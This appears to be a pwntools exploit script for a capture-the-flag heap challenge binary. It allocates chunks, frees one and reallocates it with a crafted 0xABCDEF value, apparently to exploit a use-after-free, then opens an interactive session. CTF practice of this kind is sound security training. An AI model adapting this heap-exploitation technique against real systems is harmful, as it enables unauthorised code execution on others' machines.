#!/usr/bin/python3

from pwn import *

exe = ELF('pwn1_ff_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b* 0x0000000000400cd4

                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)

GDB()


def create(size, payload):
    sla(b">\n", b"1")
    sla(b"size:", size)
    sa(b"data:", payload)


def delete(idx):
    sla(b">\n", b"2")
    sla(b"index:", idx)

create(b"40", b"0"*8)
create(b"40", b"1"*8)
create(b"16", b"a" * 8 + p64(0xABCDEF))
delete(b"2")
create(b"16", b"a")
sla(b">\n", b"4")


p.interactive()
